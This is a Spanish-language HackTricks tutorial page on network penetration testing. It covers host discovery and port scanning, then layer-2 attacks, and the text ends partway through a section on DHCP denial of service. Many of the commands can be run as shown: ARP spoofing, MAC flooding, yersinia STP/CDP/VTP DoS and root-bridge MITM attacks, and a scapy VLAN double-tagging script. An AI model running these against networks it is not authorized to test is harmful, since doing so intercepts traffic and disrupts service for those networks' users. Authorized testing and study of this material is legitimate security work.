# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **reg√≠strate** en **Intigriti**, una **plataforma de bug bounty premium creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descubriendo hosts desde el exterior

Esta va a ser una **breve secci√≥n** sobre c√≥mo encontrar **IPs que responden** desde el **Internet**.\
En esta situaci√≥n tienes un **alcance de IPs** (quiz√°s incluso varios **rangos**) y solo necesitas encontrar **qu√© IPs est√°n respondiendo**.

### ICMP

Esta es la forma **m√°s f√°cil** y **r√°pida** de descubrir si un host est√° activo o no.\
Podr√≠as intentar enviar algunos **paquetes ICMP** y **esperar respuestas**. La forma m√°s sencilla es simplemente enviar una **solicitud de eco** y esperar la respuesta. Puedes hacer eso usando un simple `ping` o usando `fping` para **rangos**.\
Tambi√©n podr√≠as usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitar√° filtros a la solicitud-respuesta de eco ICMP com√∫n).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de Puertos TCP

Es muy com√∫n encontrar que todo tipo de paquetes ICMP est√°n siendo filtrados. Entonces, lo √∫nico que puedes hacer para verificar si un host est√° activo es **intentar encontrar puertos abiertos**. Cada host tiene **65535 puertos**, as√≠ que, si tienes un alcance "grande", **no puedes** probar si **cada puerto** de cada host est√° abierto o no, eso tomar√≠a demasiado tiempo.\
Entonces, lo que necesitas es un **esc√°ner de puertos r√°pido** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **puertos m√°s utilizados:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Tambi√©n podr√≠as realizar este paso con `nmap`, pero es m√°s lento y `nmap` tiene problemas para identificar hosts activos.

### Descubrimiento de Puertos HTTP

Esto es solo un descubrimiento de puertos TCP √∫til cuando deseas **enfocarte en descubrir servicios HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de Puertos UDP

Tambi√©n podr√≠as intentar verificar si hay alg√∫n **puerto UDP abierto** para decidir si deber√≠as **prestar m√°s atenci√≥n** a un **host.** Dado que los servicios UDP generalmente **no responden** con **datos** a un paquete de sondeo UDP vac√≠o, es dif√≠cil decir si un puerto est√° siendo filtrado o abierto. La forma m√°s f√°cil de decidir esto es enviar un paquete relacionado con el servicio en ejecuci√≥n, y como no sabes qu√© servicio est√° en funcionamiento, deber√≠as probar el m√°s probable seg√∫n el n√∫mero de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La l√≠nea de nmap propuesta anteriormente probar√° los **1000 puertos UDP principales** en cada host dentro del rango **/24**, pero incluso solo esto tomar√° **>20min**. Si necesita **resultados m√°s r√°pidos**, puede usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Esto enviar√° estas **probes UDP** a su **puerto esperado** (para un rango /24 esto solo tomar√° 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqu√≠ puedes encontrar una buena gu√≠a de todos los ataques Wifi bien conocidos en el momento de la escritura:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descubriendo hosts desde adentro

Si est√°s dentro de la red, una de las primeras cosas que querr√°s hacer es **descubrir otros hosts**. Dependiendo de **cu√°nto ruido** puedes/quieres hacer, se podr√≠an realizar diferentes acciones:

### Pasivo

Puedes usar estas herramientas para descubrir pasivamente hosts dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Note que las t√©cnicas comentadas en [_**Descubriendo hosts desde afuera**_](./#discovering-hosts-from-the-outside) (_Descubrimiento de puertos TCP/HTTP/UDP/SCTP_) tambi√©n pueden ser **aplicadas aqu√≠**.\
Pero, como est√°s en la **misma red** que los otros hosts, puedes hacer **m√°s cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Note que las t√©cnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](./#icmp)) tambi√©n pueden ser **aplicadas aqu√≠**.\
Pero, como est√°s en la **misma red** que los otros hosts, puedes hacer **m√°s cosas**:

* Si **haces ping** a una **direcci√≥n de difusi√≥n de subred**, el ping deber√≠a llegar a **cada host** y podr√≠an **responder** a **ti**: `ping -b 10.10.5.255`
* Haciendo ping a la **direcci√≥n de difusi√≥n de la red** podr√≠as incluso encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
* Usa las flags `-PE`, `-PP`, `-PM` de `nmap` para realizar el descubrimiento de hosts enviando respectivamente **ICMPv4 echo**, **timestamp**, y **solicitudes de m√°scara de subred:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se utiliza para **encender** computadoras a trav√©s de un **mensaje de red**. El paquete m√°gico utilizado para encender la computadora es solo un paquete donde se proporciona un **MAC Dst** y luego se **repite 16 veces** dentro del mismo paquete.\
Luego, este tipo de paquetes generalmente se env√≠an en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si **no se proporciona \[MAC]**, el paquete se env√≠a a **difusi√≥n ethernet** (y el MAC de difusi√≥n ser√° el que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de Hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que deseas escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

* **Puerto** abierto: _SYN --> SYN/ACK --> RST_
* **Puerto** cerrado: _SYN --> RST/ACK_
* **Puerto** filtrado: _SYN --> \[SIN RESPUESTA]_
* **Puerto** filtrado: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Hay 2 opciones para escanear un puerto UDP:

* Enviar un **paquete UDP** y verificar la respuesta _**ICMP unreachable**_ si el puerto est√° **cerrado** (en varios casos, ICMP ser√° **filtrado**, por lo que no recibir√°s ninguna informaci√≥n si el puerto est√° cerrado o abierto).
* Enviar **datagramas formateados** para provocar una respuesta de un **servicio** (por ejemplo, DNS, DHCP, TFTP y otros, como se lista en _nmap-payloads_). Si recibes una **respuesta**, entonces, el puerto est√° **abierto**.

**Nmap** **mezclar√° ambas** opciones usando "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son m√°s lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** est√° dise√±ado para ser utilizado junto con **TCP (Transmission Control Protocol)** y **UDP (User Datagram Protocol)**. Su principal prop√≥sito es facilitar el transporte de datos de telefon√≠a a trav√©s de redes IP, reflejando muchas de las caracter√≠sticas de fiabilidad que se encuentran en **Signaling System 7 (SS7)**. **SCTP** es un componente central de la familia de protocolos **SIGTRAN**, que tiene como objetivo transportar se√±ales SS7 a trav√©s de redes IP.

El soporte para **SCTP** es proporcionado por varios sistemas operativos, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** y **VxWorks**, lo que indica su amplia aceptaci√≥n y utilidad en el campo de las telecomunicaciones y redes.

Se ofrecen dos escaneos diferentes para SCTP por nmap: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasi√≥n de IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **M√°s opciones de nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelando direcciones IP internas

**Los routers, firewalls y dispositivos de red mal configurados** a veces responden a sondas de red utilizando **direcciones de origen no p√∫blicas**. **tcpdump** se puede utilizar para identificar paquetes recibidos de direcciones privadas durante las pruebas. Espec√≠ficamente, en Kali Linux, se pueden capturar paquetes en la **interfaz eth2**, que es accesible desde Internet p√∫blico. Es importante tener en cuenta que si tu configuraci√≥n est√° detr√°s de un NAT o un Firewall, es probable que tales paquetes sean filtrados.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Con el sniffing, puedes aprender detalles de rangos IP, tama√±os de subred, direcciones MAC y nombres de host al revisar tramas y paquetes capturados. Si la red est√° mal configurada o la infraestructura de conmutaci√≥n est√° bajo estr√©s, los atacantes pueden capturar material sensible a trav√©s del sniffing pasivo de red.

Si una red Ethernet conmutada est√° configurada correctamente, solo ver√°s tramas de difusi√≥n y material destinado a tu direcci√≥n MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Se puede, adem√°s, capturar paquetes de una m√°quina remota a trav√©s de una sesi√≥n SSH con Wireshark como la GUI en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturing credentials

Puedes usar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar credenciales de un pcap o de una interfaz en vivo.

## LAN attacks

### ARP spoofing

ARP Spoofing consiste en enviar ARPResponses gratuitos para indicar que la IP de una m√°quina tiene la MAC de nuestro dispositivo. Luego, la v√≠ctima cambiar√° la tabla ARP y contactar√° nuestra m√°quina cada vez que quiera contactar la IP suplantada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Desbordar la tabla CAM del switch enviando muchos paquetes con diferentes direcciones MAC de origen. Cuando la tabla CAM est√° llena, el switch comienza a comportarse como un hub (difundiendo todo el tr√°fico).
```bash
macof -i <interface>
```
En los conmutadores modernos, esta vulnerabilidad ha sido corregida.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

El **Dynamic Trunking Protocol (DTP)** est√° dise√±ado como un protocolo de capa de enlace para facilitar un sistema autom√°tico de trunking, permitiendo que los conmutadores seleccionen autom√°ticamente puertos para el modo trunk (Trunk) o modo no trunk. La implementaci√≥n de **DTP** a menudo se considera indicativa de un dise√±o de red sub√≥ptimo, subrayando la importancia de configurar manualmente los trunks solo donde sea necesario y asegurando una documentaci√≥n adecuada.

Por defecto, los puertos de los conmutadores est√°n configurados para operar en modo Dynamic Auto, lo que significa que est√°n listos para iniciar el trunking si un conmutador vecino lo solicita. Surge una preocupaci√≥n de seguridad cuando un pentester o atacante se conecta al conmutador y env√≠a un marco DTP Desirable, obligando al puerto a entrar en modo trunk. Esta acci√≥n permite al atacante enumerar VLANs a trav√©s del an√°lisis de marcos STP y eludir la segmentaci√≥n de VLAN al configurar interfaces virtuales.

La presencia de DTP en muchos conmutadores por defecto puede ser explotada por adversarios para imitar el comportamiento de un conmutador, obteniendo as√≠ acceso al tr√°fico a trav√©s de todas las VLANs. El script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se utiliza para monitorear una interfaz, revelando si un conmutador est√° en modo Default, Trunk, Dynamic, Auto o Access‚Äîsiendo este √∫ltimo la √∫nica configuraci√≥n inmune a ataques de VLAN hopping. Esta herramienta eval√∫a el estado de vulnerabilidad del conmutador.

Si se identifica una vulnerabilidad en la red, se puede emplear la herramienta _**Yersinia**_ para "habilitar el trunking" a trav√©s del protocolo DTP, permitiendo la observaci√≥n de paquetes de todas las VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Para enumerar las VLANs, tambi√©n es posible generar el marco DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. No interrumpa el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales de trunk creados din√°micamente en el switch solo viven durante cinco minutos. Despu√©s de cinco minutos, el trunk se desconecta.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Quisiera se√±alar que **Access/Desirable (0x03)** indica que el marco DTP es del tipo Desirable, lo que le dice al puerto que cambie al modo Trunk. Y **802.1Q/802.1Q (0xa5)** indica el tipo de encapsulaci√≥n **802.1Q**.

Al analizar los marcos STP, **aprendemos sobre la existencia de VLAN 30 y VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs espec√≠ficas

Una vez que conozcas los IDs de VLAN y los valores de IP, puedes **configurar una interfaz virtual para atacar una VLAN espec√≠fica**.\
Si DHCP no est√° disponible, entonces usa _ifconfig_ para establecer una direcci√≥n IP est√°tica.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

El ataque discutido de **Dynamic Trunking y creaci√≥n de interfaces virtuales para descubrir hosts dentro** de otras VLANs se **realiza autom√°ticamente** con la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un atacante conoce el valor del **MAC, IP y VLAN ID del host v√≠ctima**, podr√≠a intentar **doble etiquetar un marco** con su VLAN designada y la VLAN de la v√≠ctima y enviar un paquete. Como la **v√≠ctima no podr√° conectarse de vuelta** con el atacante, la **mejor opci√≥n para el atacante es comunicarse a trav√©s de UDP** a protocolos que pueden realizar algunas acciones interesantes (como SNMP).

Otra opci√≥n para el atacante es lanzar un **escaneo de puertos TCP suplantando una IP controlada por el atacante y accesible por la v√≠ctima** (probablemente a trav√©s de internet). Luego, el atacante podr√≠a espiar en el segundo host de su propiedad si recibe algunos paquetes de la v√≠ctima.

![](<../../.gitbook/assets/image (190).png>)

Para realizar este ataque, podr√≠as usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que est√°s conectado directamente**, tienes la capacidad de **eludir la segmentaci√≥n VLAN** dentro de la red. Simplemente **cambia el puerto a modo trunk** (tambi√©n conocido como trunk), crea interfaces virtuales con los IDs de las VLANs objetivo y configura una direcci√≥n IP. Puedes intentar solicitar la direcci√≥n din√°micamente (DHCP) o puedes configurarla est√°ticamente. Depende del caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

En ciertos entornos, como redes inal√°mbricas para invitados, se implementan configuraciones de **aislamiento de puertos (tambi√©n conocido como VLAN privada)** para evitar que los clientes conectados a un punto de acceso inal√°mbrico se comuniquen directamente entre s√≠. Sin embargo, se ha identificado una t√©cnica que puede eludir estas medidas de aislamiento. Esta t√©cnica explota la falta de ACLs de red o su configuraci√≥n incorrecta, permitiendo que los paquetes IP sean enrutados a trav√©s de un router para alcanzar a otro cliente en la misma red.

El ataque se ejecuta creando un **paquete que lleva la direcci√≥n IP del cliente de destino pero con la direcci√≥n MAC del router**. Esto provoca que el router reenv√≠e err√≥neamente el paquete al cliente objetivo. Este enfoque es similar al utilizado en los Ataques de Doble Etiquetado, donde se utiliza la capacidad de controlar un host accesible para la v√≠ctima para explotar la vulnerabilidad de seguridad.

**Pasos Clave del Ataque:**

1. **Creaci√≥n de un Paquete:** Se crea un paquete especialmente para incluir la direcci√≥n IP del cliente objetivo pero con la direcci√≥n MAC del router.
2. **Explotaci√≥n del Comportamiento del Router:** El paquete creado se env√≠a al router, que, debido a la configuraci√≥n, redirige el paquete al cliente objetivo, eludiendo el aislamiento proporcionado por las configuraciones de VLAN privada.

### VTP Attacks

VTP (VLAN Trunking Protocol) centraliza la gesti√≥n de VLAN. Utiliza n√∫meros de revisi√≥n para mantener la integridad de la base de datos de VLAN; cualquier modificaci√≥n incrementa este n√∫mero. Los switches adoptan configuraciones con n√∫meros de revisi√≥n m√°s altos, actualizando sus propias bases de datos de VLAN.

#### VTP Domain Roles

* **VTP Server:** Gestiona VLANs‚Äîcrea, elimina, modifica. Transmite anuncios de VTP a los miembros del dominio.
* **VTP Client:** Recibe anuncios de VTP para sincronizar su base de datos de VLAN. Este rol est√° restringido de modificaciones locales de configuraci√≥n de VLAN.
* **VTP Transparent:** No participa en actualizaciones de VTP pero reenv√≠a anuncios de VTP. No se ve afectado por ataques de VTP, mantiene un n√∫mero de revisi√≥n constante de cero.

#### VTP Advertisement Types

* **Summary Advertisement:** Transmitido por el servidor VTP cada 300 segundos, llevando informaci√≥n esencial del dominio.
* **Subset Advertisement:** Enviado tras cambios en la configuraci√≥n de VLAN.
* **Advertisement Request:** Emitido por un cliente VTP para solicitar un Summary Advertisement, t√≠picamente en respuesta a la detecci√≥n de un n√∫mero de revisi√≥n de configuraci√≥n m√°s alto.

Las vulnerabilidades de VTP son explotables exclusivamente a trav√©s de puertos trunk, ya que los anuncios de VTP circulan √∫nicamente a trav√©s de ellos. Los escenarios posteriores a un ataque DTP podr√≠an pivotar hacia VTP. Herramientas como Yersinia pueden facilitar ataques de VTP, con el objetivo de eliminar la base de datos de VLAN, interrumpiendo efectivamente la red.

Nota: Esta discusi√≥n se refiere a la versi√≥n 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
En el modo gr√°fico de Yersinia, elige la opci√≥n de eliminar todas las VLAN de VTP para purgar la base de datos de VLAN.

### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas √©xito en un ataque STP.**

#### **STP BPDU DoS**

Enviando una gran cantidad de BPDUs TCP (Notificaci√≥n de Cambio de Topolog√≠a) o Conf (las BPDUs que se env√≠an cuando se crea la topolog√≠a), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Cuando se env√≠a un TCP, la tabla CAM de los switches se eliminar√° en 15s. Luego, si est√°s enviando continuamente este tipo de paquetes, la tabla CAM se reiniciar√° continuamente (o cada 15 segundos) y cuando se reinicie, el switch se comporta como un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Ra√≠z STP**

El atacante simula el comportamiento de un switch para convertirse en la ra√≠z STP de la red. Luego, m√°s datos pasar√°n a trav√©s de √©l. Esto es interesante cuando est√°s conectado a dos switches diferentes.\
Esto se hace enviando paquetes BPDUs CONF diciendo que el valor de **prioridad** es menor que la prioridad real del switch ra√≠z actual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante est√° conectado a 2 switches, puede ser la ra√≠z del nuevo √°rbol y todo el tr√°fico entre esos switches pasar√° a trav√©s de √©l** (se realizar√° un ataque MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) es esencial para la comunicaci√≥n entre dispositivos CISCO, permiti√©ndoles **identificarse entre s√≠ y compartir detalles de configuraci√≥n**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP est√° configurado para transmitir informaci√≥n a trav√©s de todos los puertos, lo que podr√≠a llevar a un riesgo de seguridad. Un atacante, al conectarse a un puerto de switch, podr√≠a desplegar sniffers de red como **Wireshark**, **tcpdump** o **Yersinia**. Esta acci√≥n puede revelar datos sensibles sobre el dispositivo de red, incluyendo su modelo y la versi√≥n de Cisco IOS que ejecuta. El atacante podr√≠a entonces apuntar a vulnerabilidades espec√≠ficas en la versi√≥n de Cisco IOS identificada.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Un enfoque m√°s agresivo implica lanzar un ataque de Denial of Service (DoS) al abrumar la memoria del switch, pretendiendo ser dispositivos CISCO leg√≠timos. A continuaci√≥n se muestra la secuencia de comandos para iniciar tal ataque utilizando Yersinia, una herramienta de red dise√±ada para pruebas:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, la CPU del switch y la tabla de vecinos CDP est√°n muy sobrecargadas, lo que lleva a lo que a menudo se denomina **‚Äúpar√°lisis de red‚Äù** debido al consumo excesivo de recursos.

#### Ataque de suplantaci√≥n de CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Podr√≠as tambi√©n usar [**scapy**](https://github.com/secdev/scapy/). Aseg√∫rate de instalarlo con el paquete `scapy/contrib`.

### Ataques VoIP y la herramienta VoIP Hopper

Los tel√©fonos VoIP, cada vez m√°s integrados con dispositivos IoT, ofrecen funcionalidades como desbloquear puertas o controlar termostatos a trav√©s de n√∫meros de tel√©fono especiales. Sin embargo, esta integraci√≥n puede presentar riesgos de seguridad.

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) est√° dise√±ada para emular un tel√©fono VoIP en varios entornos (Cisco, Avaya, Nortel, Alcatel-Lucent). Descubre el ID de VLAN de la red de voz utilizando protocolos como CDP, DHCP, LLDP-MED y 802.1Q ARP.

**VoIP Hopper** ofrece tres modos para el Protocolo de Descubrimiento de Cisco (CDP):

1. **Modo Sniff** (`-c 0`): Analiza paquetes de red para identificar el ID de VLAN.
2. **Modo Spoof** (`-c 1`): Genera paquetes personalizados que imitan los de un dispositivo VoIP real.
3. **Modo Spoof con Paquete Pre-hecho** (`-c 2`): Env√≠a paquetes id√©nticos a los de un modelo espec√≠fico de tel√©fono IP Cisco.

El modo preferido para velocidad es el tercero. Requiere especificar:

* La interfaz de red del atacante (`-i` par√°metro).
* El nombre del dispositivo VoIP que se est√° emulando (`-E` par√°metro), siguiendo el formato de nomenclatura de Cisco (por ejemplo, SEP seguido de una direcci√≥n MAC).

En entornos corporativos, para imitar un dispositivo VoIP existente, uno podr√≠a:

* Inspeccionar la etiqueta MAC en el tel√©fono.
* Navegar por la configuraci√≥n de pantalla del tel√©fono para ver la informaci√≥n del modelo.
* Conectar el dispositivo VoIP a una laptop y observar las solicitudes CDP usando Wireshark.

Un comando de ejemplo para ejecutar la herramienta en el tercer modo ser√≠a:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeraci√≥n
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Se pueden realizar dos tipos de DoS** contra servidores DHCP. El primero consiste en **simular suficientes hosts falsos para usar todas las direcciones IP posibles**.\
